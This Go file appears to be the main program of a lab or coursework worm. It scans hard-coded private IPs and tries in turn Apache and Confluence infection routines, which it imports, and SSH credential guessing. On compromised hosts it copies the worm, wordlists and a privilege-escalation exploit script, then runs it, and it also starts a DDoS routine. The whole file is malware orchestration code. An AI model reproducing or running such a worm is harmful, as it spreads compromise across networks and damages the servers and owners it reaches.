package main

import (
	"sync"
	"fmt"
	"github.com/99graciamanel/mlw/worm/infection"
	"github.com/99graciamanel/mlw/worm/scan"
	"github.com/99graciamanel/mlw/worm/ddos"
	"strconv"
	"os"
)

func attack(wg *sync.WaitGroup, id int, ip string) {
	attackerString := fmt.Sprintf("Attacker %d: ",id)
	
	fmt.Println(attackerString + ip)
	ports := scan.ScanIp(ip)
	fmt.Println(ports)
	infected := false
	//Apache infect
	if ports[0] != 0 {
		if (!infection.ApacheCheckInfection(ip, strconv.Itoa(ports[0]))) {
			infected = infection.ApacheInfect(ip,strconv.Itoa(ports[0]))
			//fmt.Println(infected)
		}
	}
	//Confluence infect
	
	if !infected && ports[2] != 0 {
		ip_port := ip + ":" + strconv.Itoa(ports[2])
		confluenceUrl := "http://" + ip_port
		confluenceEndpoint := "/pages/createpage-entervariables.action?SpaceKey=x"
		if (!infection.ConfluenceCheckInfection(confluenceUrl, confluenceEndpoint)) {
			infected = infection.ConfluenceInfect(confluenceUrl, confluenceEndpoint)
			fmt.Println(infected)
		}
	}
	//SSH infect
	if !infected && ports[1] != 0 {
		ip_port := ip + ":" + strconv.Itoa(ports[1])
		hit_credentials := infection.GuessSSHConnection(ip_port)
		if hit_credentials{
			is_infected := infection.SshCheckInfection(ip_port)
			fmt.Println(is_infected)
			if is_infected {
				return
			}
			message := infection.SshInfect(ip_port, "worm")
			message = infection.SshInfect(ip_port, "users.txt")
			message = infection.SshInfect(ip_port, "passwords.txt")
			//message = infection.SshInfect(ip_port, "slowloris")
			message = infection.SshInfect(ip_port, "exploit_nss.py")
			//message = infection.SshInfect(ip_port, "exploit_nss_manual")
			//fmt.Println(message)
			message = infection.SshExploit(ip_port)
			fmt.Println(message)
			infected = true
		}
	}
	wg.Done()
}

func main() {
	f, err := os.Create("/tmp/test")
	if err != nil {
        panic(err)
    }
	defer f.Close()
	var wg sync.WaitGroup
	wg.Add(1)
	go ddos.Hello(&wg,"test")

	nAttackers := 6
	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
	var ipList [6]string

	ipList[0] = "10.0.2.11"
	ipList[1] = "10.0.2.12"
	ipList[2] = "10.0.2.13"
	ipList[3] = "10.0.2.14"
	ipList[4] = "localhost"
	ipList[5] = "10.0.2.8"

	for i := 0; i < nAttackers; i++ {
		ip := scan.GetRandomIp(baseIp[0])
		ip = ipList[i]
		fmt.Println(i)
		wg.Add(1)
		go attack(&wg, i, ip)
	}
	wg.Wait()
}
